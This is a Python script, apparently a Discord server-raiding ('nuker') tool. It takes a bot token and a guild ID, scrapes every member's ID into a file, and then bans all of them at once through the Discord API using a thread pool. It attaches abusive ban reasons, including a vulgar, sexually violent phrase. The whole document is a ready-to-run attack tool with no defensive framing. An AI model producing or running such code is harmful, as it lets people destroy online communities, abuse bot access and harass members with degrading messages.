import random, time, os, httpx, discord
import shutil
from concurrent.futures import ThreadPoolExecutor


os.system("cls & mode 80, 23")

token = input(f"Token -> ")

threads = []
codes = [200, 201, 204]
members = 0
guild = ""
auth = {"Authorization": f"Bot {token}"}
intents = discord.Intents.all()
client = discord.Client(intents=intents)
reasons = random.choice(
    ["THUSKYFUCKEDYOU", "SERVERFUCKEDBYTHUSKY", "RAPEDPUSSY", "IRUNYOU", "GETRAN"]
)
columns = shutil.get_terminal_size().columns
os.system("cls & mode 80, 23")


def worker(user):
    api = "https://discord.com/api/v{}/guilds/{}/bans/{}?reason={}".format(
        random.randint(6, 9), guild, user, reasons
    )
    response = httpx.put(api, headers=auth)
    if response.status_code in codes:
        print(f"Succesfully Punished -> {user}".center(columns))
    else:
        print(f"Unable To Punish Member -> {user}".center(columns))


def theradpool():
    with ThreadPoolExecutor() as executor:
        time.sleep(0.014)
        with open("members.txt") as f:
            Ids = f.readlines()
        for user in Ids:
            threads.append(executor.submit(worker, user))


@client.event
async def on_ready():
    global members
    global guild
    guildid = int(input(f"Guild ID -> ").center(columns))
    guild = guildid
    users = client.get_guild(guild)
    for user in users.members:
        members += 1
        with open("members.txt", "a", encoding="UTF-8") as f:
            f.write(f"{user.id}\n")
    print(f"Scraped -> {members} Members from {guild}".center(columns))
    os.system("cls")
    print("Starting Server Execution".center(columns))
    time.sleep(2)
    theradpool()


client.run(token)
